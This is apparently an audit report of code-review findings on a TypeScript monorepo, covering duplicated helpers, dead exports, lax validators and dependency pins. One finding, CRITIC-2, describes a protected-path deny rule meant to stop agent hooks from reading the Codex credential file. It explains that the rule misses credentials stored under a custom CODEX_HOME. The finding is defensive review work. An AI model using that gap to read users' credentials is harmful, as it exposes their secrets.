**Problem.** Four things are reimplemented rather than shared. (1) `requireHeldGlobalLock` exists in foundation-compaction.ts:267-279 as a byte-for-byte equivalent of the exported coordinator.ts:198-211, which already has other lifecycle importers. (2) The strict canonical Foundation journal read is written twice: `readStrictJournal` in foundation-compaction.ts:230-251 and `readTerminalFoundationJournal` in coordinator-compaction.ts:71-88. (3) `syncDirectoryAt` is written three times in core lifecycle (foundation-compaction.ts:281, coordinator-compaction.ts:62, recovery.ts:336) and a fourth time at apps/cli/src/lifecycle/uninstall.ts:267. The helpers `child` and `namesOf`, and the `LOWERCASE_V4_UUID` regex, are duplicated the same way. (4) The staged-leaf unlink loop in `discardCounterfactualInverse` (coordinator-compaction.ts:107-116) repeats `FoundationParticipantExecutor.discardUnstarted` (foundation-participant.ts:239-249). The copies have drifted: recovery.ts:332 `childPath` builds paths with an unchecked `as CanonicalAbsolutePathV1` cast, while every sibling validates with `parseCanonicalAbsolutePathText`. A future fix to one guard (identity checks, error reasons) will miss the others.

**Evidence.**

```
`grep -rn "function syncDirectoryAt\|function childPath\|function child(\|function namesOf" packages/core/src/lifecycle apps/cli/src --include=*.ts | grep -v test` lists foundation-compaction.ts:41,281; foundation-participant.ts:72; coordinator-compaction.ts:58,62; recovery.ts:323,332,336; ledger-v2.ts:128; uninstall.ts:267. foundation-compaction.ts:271-275 repeats `observed.kind !== "regular_file" || observed.dev !== dependencies.global.dev || observed.ino !== dependencies.global.ino`, the same comparison as coordinator.ts:203-208. `LOWERCASE_V4_UUID` is also declared in allocator.ts:66, store.ts:67 and foundation-compaction.ts:38.
```

**Fix.** Add a small internal `fs-helpers.ts` in the lifecycle directory. Export `childOf`, `syncDirectoryAt(fs, path)`, `namesOf(fs, dir)`, `LOWERCASE_V4_UUID` and one `readStrictFoundationJournal`. Reuse the coordinator.ts `requireHeldGlobalLock` (make foundation-compaction call it with `dependencies.fs` and `dependencies.global`). Reuse it from recovery, both compaction modules and uninstall.ts.

**Validation.** `tsc -b` and eslint stay green. Run the existing allocator, store, coordinator-compaction, foundation-compaction and recovery test files; the death-point tests in coordinator-compaction.test.ts exercise every moved helper.

**Verifier (downgraded).** The duplication is real. foundation-compaction.ts:267-279 requireHeldGlobalLock is identical to the exported coordinator.ts:198-211 except for the parameter shape. readStrictJournal (foundation-compaction.ts:230-251) and readTerminalFoundationJournal (coordinator-compaction.ts:71-88) are the same logic. syncDirectoryAt is copied verbatim three times. The staged-leaf unlink loop in coordinator-compaction.ts:107-116 mirrors foundation-participant.ts:239-249. The only claimed drift is recovery.ts:332 childPath doing an unchecked cast, and the finding shows no wrong behavior from it. Every copy behaves the same today, so this is maintainability debt, not a defect. Medium overstates it.

### CORE-LIFE-3 · dead-code · Three enum constants have no production consumer, and their tests only pin each constant to its own literal

`packages/core/src/lifecycle/types.ts:63` · removal confidence: medium

**Problem.** `LIFECYCLE_COORDINATOR_STEP_KINDS`, `LIFECYCLE_COMPACTION_ENTRY_KINDS` and `LIFECYCLE_JOURNAL_CLOSURE_KINDS` are exported (lifecycle/index.ts and core index.ts) but read by nothing except tests. The codec hardcodes step kinds itself (codecs.ts:246-247 `network_push: ["kind", "pushPlanHash"]`, and so on). The only tests (codecs.test.ts:572, 616, 623) assert that each constant equals the literal array written next to it, so they cannot fail on a real behavior change. `LIFECYCLE_JOURNAL_CLOSURE_KINDS` has also drifted from its type: the array lists the 4 V1 kinds, while `LifecycleJournalClosureV2` has 3 more (`update_recovery`, `update_construction_cleanup`, `update_executor_cleanup`).

**Evidence.**

```
`grep -rnw "LIFECYCLE_COORDINATOR_STEP_KINDS\|LIFECYCLE_JOURNAL_CLOSURE_KINDS\|LIFECYCLE_COMPACTION_ENTRY_KINDS" apps packages tests --include=*.ts | grep -v /dist/` returns only types.ts definitions, the two index.ts re-exports, index.test.ts:347-352 (export-name list) and codecs.test.ts (self-equality). No codec or runtime reference exists.
```

**Fix.** Either delete the three constants, their re-exports and the self-equality tests, or derive the unions from them and make the codec and grammar tables use them (for example `TEMPLATE_STEP_KINDS` in grammar.ts can be `satisfies` against `LIFECYCLE_COORDINATOR_STEP_KINDS`). Prefer deletion.

**Validation.** After removal, `tsc -b` is green and `rg` for the names returns nothing. Update the export-name list in packages/core/src/index.test.ts:347-352.

**Verifier (confirmed).** `rg` across the repo (excluding dist) finds only the types.ts definitions, re-exports in lifecycle/index.ts and core index.ts, the export-name pin at index.test.ts:347-352, and self-equality asserts at codecs.test.ts:572/616/623. Nothing derives a type from them with `typeof X[number]`, and no runtime code reads them, so they are unused. The index.test pin is an export-list snapshot, not a consumer. One claim is wrong: LIFECYCLE_JOURNAL_CLOSURE_KINDS 'drifting' from LifecycleJournalClosureV2. It lists exactly the V1 closure kinds, and nothing says it should cover V2. Low severity with medium removal confidence is right, because the names are part of the package's pinned public export list.

### CORE-REST-2 · logic · ManifestStore.readOptional/writeV2 re-fold validator code defects into ManifestStateError, defeating NEW-92

`packages/core/src/manifest/store.ts:304`

**Problem.** NEW-92 (6fb50b58) made `call()` in v2.ts rethrow TypeError/RangeError/ReferenceError so a defect in an injected admission callback is not reported as a malformed manifest (exit 6, recovery_required) on a healthy home. The store then wraps `validateManifestBytes(bytes, context)` in a bare `catch { throw new ManifestStateError(); }`, and `writeV2` ends with `throw new ManifestStateError()` for every non-ManifestStateError. status, doctor and uninstall all read through `readOptional(context)`, so the exact failure NEW-92 removed returns on those paths. Only the CLI routing in bootstrap/report.ts honours the rule.

**Evidence.**

```
store.ts:303-306: `try { const { validateManifestBytes } = await import("./v2.js"); return validateManifestBytes(bytes, context); } catch { throw new ManifestStateError(); }`. writeV2 (store.ts:332-343): `catch (error) { if (error instanceof ManifestStateError) throw error; throw new ManifestStateError(); }`. v2.ts:28-29 `codeDefect`/`call` rethrow defects. Callers with a context: apps/cli/src/commands/status.ts:60, doctor.ts:985/996, uninstall.ts:688. v2.test.ts:227-247 tests only the validator, and manifest.test.ts has no store-level defect test.
```

**Fix.** In readOptional and writeV2, rethrow `TypeError`/`RangeError`/`ReferenceError` (export `codeDefect` from v2.ts or inline the check) and map only other errors to ManifestStateError. Keep the import() failure mapped as-is.

**Validation.** Add a store test: a ManifestStore whose context.admitOwnerPath throws TypeError makes readOptional(context) reject with TypeError, not ManifestStateError. A plain malformed byte string must still raise ManifestStateError.

**Verifier (downgraded).** Confirmed: store.ts:303-306 folds every error from validateManifestBytes into ManifestStateError, and writeV2 does the same. v2.ts deliberately lets codeDefect errors and admitOwnerPath errors escape (NEW-92). NEW-92's commit 6fb50b58 scoped the fix to the validator and the ordinary-command routing in report.ts, and its residual NEW-124 is closed, so the store path is genuinely uncovered and not tracked. Impact needs a latent code defect in an admission callback, and the result is a misreported status or doctor outcome, not data loss. Low, not medium.

### CORE-REST-3 · duplication · Bounded exact-size file read is implemented four times in the manifest module

`packages/core/src/manifest/drift.ts:43`

**Problem.** `readBounded` is byte-for-byte the same function in store.ts and drift.ts, apart from the byte ceiling constant. The open, stat, compare dev/ino/size, read, re-stat TOCTOU sequence is repeated in store.ts `readOptional`, drift.ts `readGuardedFile` and drift.ts `readV2File`. A fix to one (e.g. the size/identity checks) will not reach the others.

**Evidence.**

```
store.ts `async function readBounded(handle, size)` and drift.ts:43 `async function readBounded(handle, size)` both loop `handle.read(bytes, offset, ...)` and then probe one extra byte. The `opened.dev !== before.dev || opened.ino !== before.ino || opened.size !== before.size` chain appears in store.ts, drift.ts readGuardedFile and drift.ts readV2File.
```

**Fix.** Extract `readStableRegularFile(fs, canonicalPath, before, maxBytes)` into one module (e.g. manifest/fs-read.ts) and call it from the three sites.

**Validation.** Existing manifest.test.ts and drift tests should pass unchanged. Add one test that a size change between stat and read throws ManifestStateError through each caller.

**Verifier (confirmed).** readBounded is identical in store.ts:239-251 and drift.ts:42-54 apart from the byte limit. The dev/ino/size TOCTOU chain repeats in store.ts:292/295, drift.ts:90-98 (readGuardedFile) and drift.ts:216/219 (readV2File). 'Four times' slightly overcounts, since that means two readBounded copies plus three stat-chain sites, but the duplication is real.

### CORE-REST-4 · duplication · isObject/hasExactKeys/isHash/isNonEmptyString/isIsoDate re-declared in six core modules

`packages/core/src/plans/validate.ts:88`

**Problem.** The same shape-guard helpers are private copies in plans/validate.ts, manifest/store.ts, transactions/store.ts, transactions/executor.ts (isRecord/hasExactKeys), instructions/catalog.ts and apps/cli/src/hooks/guards/prompt.ts. `isIsoDate` is also lax (`Date.parse` accepts '2026') in both manifest/store.ts and transactions/store.ts, while v2.ts uses the strict `parseUtcTimestamp`. The hash regex is hand-written in three places beside `parseLowerHexSha256`.

**Evidence.**

```
grep -rnE 'function (hasExactKeys|isHash|isObject|isNonEmptyString|isIsoDate)' packages/core/src: plans/validate.ts:88-106, manifest/store.ts:133-155, transactions/store.ts:69-82. store.ts:147 `return typeof value === "string" && !Number.isNaN(Date.parse(value));`.
```

**Fix.** Add one internal `core/src/shape.ts` (isRecord, hasExactKeys) and use `parseLowerHexSha256`/`parseUtcTimestamp` from update/scalars for hashes and timestamps. Keep the V1 leniency only if legacy bytes need it.

**Validation.** tsc -b and the existing store/plan/transaction suites. Add a test that a journal with `createdAt: "2026"` is refused if the strict timestamp is adopted.

**Verifier (confirmed).** Private copies exist in plans/validate.ts:88-106, manifest/store.ts:133-155, transactions/store.ts:73-82, transactions/executor.ts:194/202, instructions/catalog.ts:36 and hooks/guards/prompt.ts:19/23. The lax `isIsoDate` (Date.parse) at store.ts:147 is real and differs from v2's strict timestamp parsing. Nothing in BACKLOG tracks it.

### CORE-REST-5 · dead-code · ManifestStore.writeV2 has no production caller

`packages/core/src/manifest/store.ts` · fixed in 1a7cb2ab, which drops `writeV2`, so no line holds it (re-pointed 2026-10-07, NEW-193) · removal confidence: medium

**Problem.** The only callers of `writeV2` are tests, so the V2 canonical write path with its dynamic imports is unreachable in the product. V2 manifests reach disk through the manifest-state participant and the transaction executor instead. A second writer with its own temp/rename logic can drift from those.

**Evidence.**

```
grep -rnw writeV2 apps packages --include=*.ts (excluding node_modules/dist): apps/cli/src/commands/uninstall.test.ts:912, packages/core/src/manifest/manifest.test.ts:299, packages/core/src/manifest/store.ts:332. No non-test hits.
```

**Fix.** Remove `writeV2` and move the two test usages to a test helper, or document it as the sanctioned V2 writer and route the participant through it.

**Validation.** tsc -b after removal. The uninstall.test.ts:912 fixture and manifest.test.ts:299 need a replacement writer.

**Verifier (confirmed).** `grep -rnw writeV2` finds only store.ts:332, manifest.test.ts:299 and uninstall.test.ts:912, so it has no production caller. It was added in a8706cc7 (drift feature) and is effectively a test-fixture writer. Removal confidence is medium, because tests depend on it as a convenience writer.

### CORE-UPD-3 · dead-code · Unreachable `components.length > 12` bound

`packages/core/src/update/capacity.ts:120` · removal confidence: high

**Problem.** The projection loop iterates only `UPDATE_CAPACITY_COMPONENT_ORDER`, which has 10 kinds, and duplicate kinds were already rejected. `components` can therefore never exceed 10, so the `> 12` arm never fires. It reads as a spec cap that does not match the 10-kind enum.

**Evidence.**

```
capacity.ts:120 `if (components.length < 1 || components.length > 12) fail("UpdateCapacityProjectionV1.components");` after `for (const kind of UPDATE_CAPACITY_COMPONENT_ORDER)` and `if (byKind.has(component.kind)) fail(...duplicate kind)`.
```

**Fix.** Drop the `> 12` arm and keep only the `< 1` check. Alternatively, derive the bound from `UPDATE_CAPACITY_COMPONENT_ORDER.length`.

**Validation.** capacity.test.ts passes unchanged. tsc -b stays green.

**Verifier (confirmed).** Verified at capacity.ts:120. UPDATE_CAPACITY_COMPONENT_ORDER (lines 42-53) has 10 kinds, the input loop rejects duplicates and unknown kinds, and the projection pushes at most one entry per order kind. The `> 12` arm cannot fire. It is a trivial dead bound.

### CORE-UPD-4 · inconsistency · Validator primitives copied per file with differing strictness

`packages/core/src/update/coordinator.ts:254`

**Problem.** `fail`, `record`, `exact`, `integer`, `array` and `oneOf` are redefined privately in coordinator, construction, participants, planner, release, preview and owner. The copies are not equivalent. planner.ts and release.ts `record()` also reject objects with a non-Object.prototype, non-null prototype. coordinator.ts, construction.ts and participants.ts `record()` do not. The same journal and plan JSON therefore gets different object-shape validation depending on which module parses it. The array error labels also differ (`${label}: count` in planner versus bare `label` in coordinator).

**Evidence.**

```
coordinator.ts:254-258 `function record(...) { if (typeof value !== "object" || value === null || Array.isArray(value)) fail(label); return value ...}`. planner.ts record(): `const prototype = Object.getPrototypeOf(value) as object | null; if (prototype !== Object.prototype && prototype !== null) fail(label);`. release.ts has the same prototype check. Ran: grep -nE '^function (fail|integer|record|exact|array|oneOf)' update/*.ts.
```

**Fix.** Export one strict set (prototype-checked `record`, `exact`, `integer`, `array`, `oneOf`) from a single module. bundle-participant.ts already exports `exact`, `fail`, `integer`, `list` and `oneOf`, which retirement.ts imports. Make every update module import them.

**Validation.** The full core test suite plus planner and coordinator negative-shape tests. Add one case that a class-instance object is refused by the coordinator and construction parsers.

**Verifier (confirmed).** Verified: the record() helpers in coordinator.ts:254, construction.ts:428 and participants.ts:232 have no prototype check, while planner.ts:300 and release.ts:209 refuse non-plain prototypes. Impact is small, because JSON.parse output always has Object.prototype. The divergence only matters for in-memory objects passed to the validators.

### CORE-UPD-5 · dead-code · Public exports referenced only by index re-exports, the export-list test and unit tests

`packages/core/src/update/scalars.ts:97` · removal confidence: low

**Problem.** Several exported values have no production caller anywhere in packages or apps. The coordinator drives compensation through the `UpdateParticipantAdapterV1.compensate` port, not `compensateParticipants`. They survive only because packages/core/src/index.test.ts pins the exported-name list.

**Evidence.**

```
Searched with git grep -nE over '*.ts' and '*.md', excluding plugins. Hits were only the definition, update/index.ts, packages/core/src/index.test.ts and the module's own test, for: parseTenDigitZeroPaddedOrdinal (scalars.ts:97, defined once and never used internally), compensateParticipants (participants.ts:129), bundleSourceCompactionComplete (bundle-participant.ts:835), rollbackPayloadSourceCompactionComplete (rollback.ts:1298), projectRetainedSchemaMigrationInverse (migrations.ts:638), rollbackPayloadRetirementRef (rollback.ts:809).
```

**Fix.** Decide per symbol whether the CLI apply path (apps/cli/src/update) is meant to call it. If not, delete the function with its test and its entry in index.ts and index.test.ts. If it is intended, wire it in and record that in the plan.

**Validation.** Run tsc -b and the core index export-list test after removal. The grep for each name must return zero hits outside the deleted files.

**Verifier (confirmed).** git grep (excluding plugins, including *.md) finds each symbol only in its defining module, update/index.ts, index.test.ts and its own unit test, with no production caller in packages or apps and no doc or BACKLOG reference. compensateParticipants has a doc comment but no caller. Removal confidence stays low, because these are public package exports that a not-yet-wired apply path might be meant to consume.

### CORE-UPD-6 · duplication · CLI reimplements compareUtf8, which core re-exports from a release module

`apps/cli/src/update/compose.ts:230`

**Problem.** `compareUtf8` is defined in lifecycle/canonical-json.ts, but about 14 modules import it through `./release.js` (`export { compareUtf8 };` at release.ts:227, a mid-file re-export). apps/cli compose.ts also defines its own copy. The CLI copy and core's must stay byte-for-byte the same ordering, because the ordering feeds hashed plans.

**Evidence.**

```
compose.ts:230 `function compareUtf8(left: string, right: string): number { return Buffer.compare(Buffer.from(left, "utf8"), Buffer.from(right, "utf8")); }`. release.ts:227 `export { compareUtf8 };`. planner-protocol.ts:9 re-exports it from `./update/release.js`.
```

**Fix.** Import `compareUtf8` from `@developer-os/core` (it is on the package index) in compose.ts. Make update modules import it from `../lifecycle/canonical-json.js` and drop the pass-through in release.ts.

**Validation.** tsc -b, plus compose.test.ts and the planner determinism tests unchanged.

**Verifier (confirmed).** compose.ts:230 does reimplement compareUtf8 with Buffer.compare, which is semantically identical to core's byte comparison (canonical-json.ts:87), so there is no current drift. Correction: compareUtf8 is NOT on the main @developer-os/core index (packages/core/src/index.ts exports only sortUtf8 from canonical-json). It is reachable via the @developer-os/core/planner-protocol subpath, which re-exports it through release.ts:227. The fix must import from that subpath or add the export to the index.

### CRITIC-2 · security · read-codex-auth protects only ~/.codex/auth.json although the product resolves and registers into CODEX_HOME

`packages/security/src/protected-paths.ts:50`

**Problem.** The CLI follows `CODEX_HOME` for the Codex vendor home: instructions/vendor-homes.ts, plugin registration, and the isolated ingest home's `auth.json` symlink to '<resolved user CODEX_HOME>/auth.json'. ProtectedPathPolicy, however, is built from the user home alone and pins the credential rule to `.codex/auth.json` under that home. For a user with `CODEX_HOME=/somewhere`, the real Codex credential is not protected from agent reads and writes through `guard path` and `guard format`, from `import`, or from guarded readText. The isolated-home symlink also canonicalizes to an unprotected path.

**Evidence.**

```
protected-paths.ts:50: `{ id: "read-codex-auth", match: { kind: "home-exact", relativePath: ".codex/auth.json" } }`; constructor takes only `home`. Instantiations: context.ts:747 `new ProtectedPathPolicy(options.userHome)`, hooks/guards/path.ts:70 `new ProtectedPathPolicy(runtime.userHome)`, hooks/guards/format.ts:46 `new ProtectedPathPolicy(userHome)`. vendor-homes.ts:19-21: '`CODEX_HOME` when absolute, else `H/.codex`' / `const codexHome = env.CODEX_HOME;`. codex-adapter.md:662: '`auth.json` → `<resolved user CODEX_HOME>/auth.json` (via `resolveVendorHomes`...'.
```

**Fix.** Pass the resolved vendor homes (resolveVendorHomes) into ProtectedPathPolicy, and add an absolute exact rule for `<codexHome>/auth.json` next to the home-relative one. Alternatively, record in threat-model.md that CODEX_HOME overrides are unprotected.

**Validation.** Test: with CODEX_HOME=<tmp>/ch and <tmp>/ch/auth.json present, `guard path` on that file and readText on it must refuse; the existing `~/.codex/auth.json` case still refuses.

**Verifier (critic-only).** Critic-only; not independently verified.

### DEAD-2 · duplication · The CLI restates the compaction-end constants that Core's never-called *CompactionComplete helpers own

`apps/cli/src/update/bundle-source.ts:624`

**Problem.** Core exports `bundleSourceCompactionComplete` (`2 * plan.entries.length + 4`) and `rollbackPayloadSourceCompactionComplete` (`2 * plan.entryCount + 10`), and nothing calls either. The CLI compaction loops hard-code the same magic bounds instead. If the journal grammar changes (Core's own codec bounds `compactionNext` at `2 * N + 4`, bundle-participant.ts:666), the CLI and Core can drift apart without any error. The only test that mentions these helpers, and `parseTenDigitZeroPaddedOrdinal`, is the export-name list in packages/core/src/index.test.ts. That snapshot cannot fail on behaviour; it only keeps the dead surface in place.

**Evidence.**

```
bundle-participant.ts:835 `export function bundleSourceCompactionComplete(plan, journal): boolean { return journal.phase === "compacting" && journal.compactionNext === 2 * plan.entries.length + 4; }`
rollback.ts:1298 `... journal.compactionNext === 2 * plan.entryCount + 10;`
bundle-source.ts:624 `const last = 2 * plan.entries.length + 4;`
rollback-source.ts:455 `const last = 2 * plan.entryCount + 10;`
`git grep -n -w bundleSourceCompactionComplete` -> bundle-participant.ts:835, update/index.ts:435, index.test.ts:411 (name list) only; same for rollbackPayloadSourceCompactionComplete (index.test.ts:599) and parseTenDigitZeroPaddedOrdinal (scalars.ts:97, index.test.ts:256).
```

**Fix.** Export the bound from Core (e.g. `bundleSourceCompactionLength(plan)` / `rollbackPayloadSourceCompactionLength(plan)`) and use it in both the CLI loops and Core's codec. Then either delete the two *CompactionComplete predicates or have the CLI assert them after its loops. Delete `parseTenDigitZeroPaddedOrdinal` unless a caller is planned.

**Validation.** Run `tsc -b`, then `vitest run apps/cli/src/update/bundle-source.test.ts apps/cli/src/update/rollback-source.test.ts packages/core/src/index.test.ts`. The barrel name-list snapshot in index.test.ts has to be updated in the same commit.

**Verifier (confirmed).** Confirmed. bundleSourceCompactionComplete (bundle-participant.ts:835), rollbackPayloadSourceCompactionComplete (rollback.ts:1298) and parseTenDigitZeroPaddedOrdinal (scalars.ts:97) appear only in barrels and the index.test.ts name list. The CLI hard-codes the same bounds: bundle-source.ts:624 `const last = 2 * plan.entries.length + 4;` and rollback-source.ts:455 `const last = 2 * plan.entryCount + 10;`. Core's codec repeats `2 * N + 4` at bundle-participant.ts:666. Downgraded to low: the constants match today, so the risk is only future drift with no current misbehaviour.

### DEAD-5 · test-gap · `projectRetainedDirectoryTree` exists only for tests and tests an uncached path production never runs

`apps/cli/src/bootstrap/retention.ts:481` · related: NEW-133

**Problem.** Production projects retained trees through `projectBootstrapRetentionPostimage`, which walks with the per-retainer NEW-133 content cache. `projectRetainedDirectoryTree` walks twice with no cache and then compares against `expectedRoot`. Nothing in production calls it. Its describe block in retention.test.ts (lines 869-996) exercises that uncached path, so those cases say nothing about the cached production walk.

**Evidence.**

```
`git grep -l -w projectRetainedDirectoryTree` -> retention.ts, retention.test.ts only.
retention.ts:487-488 `const first = await projectRetainedDirectoryTreeOnce(root, productHome); const second = await projectRetainedDirectoryTreeOnce(root, productHome);` (no cache argument)
retention.ts:455-456 (production) `const first = await walkDirectoryTreeOnce(path, productHome, cache); const second = await walkDirectoryTreeOnce(path, productHome, cache);`
```

**Fix.** Delete `projectRetainedDirectoryTree`. Point its tests at `projectBootstrapRetentionPostimage` with a cache plus an explicit `sameValue(result, expected)` assertion, so the tamper and race cases cover the path production actually runs.

**Validation.** `vitest run apps/cli/src/bootstrap/retention.test.ts`: the tamper cases must still reject.

**Verifier (confirmed).** Confirmed. Only retention.ts and retention.test.ts reference projectRetainedDirectoryTree. It calls projectRetainedDirectoryTreeOnce twice without a cache (retention.ts:487-488), while production's projectBootstrapRetentionPostimage passes a cache into its walker (lines 455-456). The tests therefore exercise a path production never runs.

### DEAD-6 · dead-code · Security exports that only tests call, one of them with a stale 'guards must invoke it' contract

`packages/security/src/paths.ts:113` · removal confidence: medium

**Problem.** Several Security exports are reached from production only through barrels, and only tests call them. `resolveOwnedPath` is documented as "Task 5 transaction guards must invoke it immediately before every filesystem operation", but no guard calls it. The comment states a contract the code does not follow, which misleads reviewers. I did not trace whether the production guards perform the same checks by another route, so this is not a security claim. Others in the same group: `recheckSystemExecutable` (async; production uses `recheckSystemExecutableSync`), `validateGitSyncPlan` (push-plan.ts:173), `bindShadowConfigToTemplate` (shadow.ts:391), and `runSshBridge` (gateways.ts:435). `runSshBridge` is idle because the CLI refuses non-local transports (service.ts:576).

**Evidence.**

```
`git grep -l -w resolveOwnedPath` -> paths.ts, paths.test.ts, index.ts, index.test.ts.
paths.ts:109-113 `/** Validates the current filesystem snapshot. Task 5 transaction guards must invoke it immediately before every filesystem operation. */ export async function resolveOwnedPath(`
`git grep -l -w recheckSystemExecutable` -> system-executables.ts and *.test.ts plus index.ts only.
`git grep -l -w validateGitSyncPlan` -> push-plan.ts, git/index.ts, index.ts, index.test.ts.
`git grep -l -w bindShadowConfigToTemplate` -> shadow.ts, shadow.test.ts, git/index.ts.
`git grep -l -w runSshBridge` -> gateways.ts, gateways.test.ts, git/index.ts.
```

**Fix.** Delete `resolveOwnedPath`, the async `recheckSystemExecutable`, `validateGitSyncPlan` and `bindShadowConfigToTemplate`, together with their barrel entries, or at least correct the `resolveOwnedPath` doc comment. Keep `runSshBridge` but mark it as dormant until the SSH transport ships.

**Validation.** Run `tsc -b`, update the export-name snapshot in packages/security/src/index.test.ts, then `vitest run packages/security`.

**Verifier (confirmed).** Confirmed. resolveOwnedPath, validateGitSyncPlan, bindShadowConfigToTemplate and runSshBridge have no production callers outside packages/security (barrels and tests only). recheckSystemExecutable is called outside security only from apps/cli/src/commands/git/runtime.test.ts:9 and a macos.test.ts method-name list. The paths.ts:109-111 doc comment says 'Task 5 transaction guards must invoke it immediately before every filesystem operation', but nothing invokes it. The CLI refuses non-local transport at git/service.ts:576, so runSshBridge is unreachable.

### DEAD-7 · dead-code · tsc --noUnusedLocals/--noUnusedParameters: one dead private method and six unused parameters

`packages/core/src/manifest/bootstrap.ts:517` · removal confidence: high

**Problem.** In a scratch tsconfig that extends each package config with noUnusedLocals and noUnusedParameters, every package is clean except for these production hits. `readOrCreateJournal` is a private method nothing calls. Four bootstrap.ts functions take an `operation: "fresh_v2_init"` parameter they never read, so 15 call sites (executor.ts, report.ts, tests) pass a literal that has no effect. `readV2File` in drift.ts ignores its `artifact` parameter. Two unused locals in test files were left out.

**Evidence.**

```
tsc output:
apps/cli/src/bootstrap/executor.ts(2646,17): 'readOrCreateJournal' is declared but its value is never read.
packages/core/src/manifest/bootstrap.ts(517,3) / (547,3) / (1476,3) / (1528,3): 'operation' is declared but its value is never read. (deriveBootstrapEnvelopePaths, deriveBootstrapCreationEvidencePaths, validateFoundationPairs, validateManifestBinding)
packages/core/src/manifest/drift.ts(205,3): 'artifact' is declared but its value is never read.
bootstrap.ts:515-519 `export function deriveBootstrapEnvelopePaths(productHome: CanonicalAbsolutePathV1, operation: "fresh_v2_init", id: FreshV2InitIdV1)` with body `const prefix = "fresh-v2-init";`
```

**Fix.** Delete `readOrCreateJournal`. Remove the `operation` parameters and the `artifact` parameter of `readV2File` along with their call-site arguments. Consider turning on noUnusedLocals in tsconfig.base.json; the only remaining hits would be the two test locals.

**Validation.** Run `tsc -b` and `npm run lint`, then `vitest run packages/core/src/manifest`.

**Verifier (confirmed).** Confirmed. readOrCreateJournal (executor.ts:2646) has only its declaration. In bootstrap.ts, deriveBootstrapEnvelopePaths (515), deriveBootstrapCreationEvidencePaths (545), validateFoundationPairs (1474) and validateManifestBinding (1526) all take `operation: "fresh_v2_init"`. deriveBootstrapEnvelopePaths hard-codes its prefix instead of reading that parameter. readV2File's body (drift.ts:205-224) never uses `artifact`. No tsconfig enables noUnusedLocals.

### DEAD-8 · inconsistency · @types/node is pinned to 22 while engines requires Node 24; esbuild is the only caret range

`./package.json:39-40` · fixed in 6e568d30; this line is the post-fix code, the repository-root manifest's `@types/node` and `esbuild` lines (re-pointed 2026-10-07, NEW-193)

**Problem.** The root manifest requires `node >=24.16.0 <25` but type-checks against `@types/node 22.19.19`. Node 24 APIs therefore have no types (the code has to cast around them), and APIs removed since 22 still type-check. `esbuild` is also the only dependency on a caret range (`^0.28.2`). Every other dependency is pinned exactly, so a lockfile refresh can move esbuild alone. All other declared dependencies are imported (zod, yaml, smol-toml, esbuild in tests/tools/pack-local-release.ts, the eslint packages), and every workspace:* dependency is used.

**Evidence.**

```
package.json: `"engines": { "node": ">=24.16.0 <25" }` ... `"@types/node": "22.19.19"`, `"esbuild": "^0.28.2"`, `"vitest": "4.1.8"`, `"typescript": "5.9.3"`.
```

**Fix.** Upgrade `@types/node` to a 24.x release and pin esbuild exactly (`0.28.x`), consistent with the other pins. Per the user's rules, ask before running the install.

**Validation.** After the user approves the install, run `tsc -b` and `npm run lint`.

**Verifier (confirmed).** Confirmed with corrections. The lines are package.json:39-40, not 45: `"@types/node": "22.19.19"` and `"esbuild": "^0.28.2"`, against engines `>=24.16.0 <25` at line 9. The claim that code has to cast around missing Node 24 types has no evidence in the finding and was not verified. The real, low-severity issue is the version mismatch plus the one caret range.

### DEAD-9 · dead-code · Exported types that nothing uses, not even their own file

`packages/workflow-schema/src/contract.ts:84` · removal confidence: high

**Problem.** Six exported type aliases occur exactly once in their own file (the declaration) and are otherwise referenced only by re-export barrels. No code imports them, and their own modules do not use them.

**Evidence.**

```
Export scan, after stripping `export ... from` re-export statements; each has self-count 1 and no other referencing file:
workflow-schema/src/contract.ts:84 `export type WorkflowOutputSchema = WorkflowInputSchema;`
workflow-schema/src/contract.ts:39 `export type RefusalCondition = (typeof REFUSAL_CONDITIONS)[number];`
core/src/update/bundle-participant.ts:214 `export type PresentBundleMetadataFileStateV1 = Extract<...>`
core/src/update/participants.ts:817 `export type CanonicalStateTransitionV1 = (typeof CANONICAL_STATE_TRANSITIONS)[number];`
platform-macos/src/launchd/process-table.ts:63 `export type LaunchdArgvSlotV1 =`
security/src/git/local-receive.ts:37 `export type GitLocalReceiveProcessNodeV1 = "receive-pack" | "index-pack";`
```

**Fix.** Delete the six aliases and their barrel re-exports.

**Validation.** Run `tsc -b` and update any barrel export-name snapshots (packages/*/src/index.test.ts).

**Verifier (confirmed).** Confirmed. git grep -w for each alias returns only the declaration and its barrel re-export: WorkflowOutputSchema, RefusalCondition, PresentBundleMetadataFileStateV1, CanonicalStateTransitionV1, LaunchdArgvSlotV1, GitLocalReceiveProcessNodeV1. Every package is `private: true`, so none of them is published API, and docs and instructions never mention them.

### FLOW-DOCS-3 · inconsistency · The `scheduled` trigger is decorative: no host-capability check, and it disagrees with the actual scheduled jobs

`docs/architecture/workflow-schema.md:143` · related: NEW-134

**Problem.** workflow-schema.md §7.2 still says 'both shipped contracts are manual-only, so no current workflow exercises this gap. Reintroducing a non-manual trigger must add the host-capability validation and a firing test in the same change.' brain-garden now declares `scheduled`, but the only trigger check in the compiler is 'scheduled requires manual'. Nothing ties a workflow's `triggers` to the automation job registry. The runner's job list is a hard-coded constant, so the YAML trigger has no effect in either direction. The two sources already disagree: `doctor` is a launchd-scheduled job, yet workflows/doctor declares only `manual`, while brain-garden, built on the same 'product code runs the workflow's checks' pattern, declares `scheduled`. §2.4's claim that `scheduled` 'fires only through developer-os automation' is therefore unenforced. §8.9's 'None of the six over-declares' is also stale (eleven workflows).

**Evidence.**

```
Doc: workflow-schema.md:143-146 "DOS-P6 removed the unfireable `session_start` and `session_end` declarations and both shipped contracts are manual-only ... Reintroducing a non-manual trigger must add the host-capability validation and a firing test in the same change." Code: workflows/brain-garden/workflow.yaml:5-7 `triggers:\n  - manual\n  - scheduled`; packages/workflow-schema/src/contract.ts:198 `if (workflow.triggers.includes("scheduled") && !workflow.triggers.includes("manual")) {` is the only trigger check (`grep -rn "\.triggers" apps packages --include=*.ts` finds no other non-test reader); packages/core/src/config/lifecycle.ts:90-97 `export const SCHEDULED_JOB_IDS = ["brain-reindex", "brain-lint", "doctor", "git-sync", "brain-garden", "brain-pulse"]`; workflows/doctor/workflow.yaml:5-6 `triggers:\n  - manual`.
```

**Fix.** Pick one model and enforce it. Option A: add a repository or contract test asserting that a workflow declares `scheduled` exactly when its id is in SCHEDULED_JOB_IDS, then add `scheduled` to workflows/doctor (version bump) or drop it from brain-garden. Option B: record in §2.4/§7.2 that `scheduled` is informational and unbound. In either case, rewrite §7.2 so it no longer says every contract is manual-only, and fix §8.9's count.

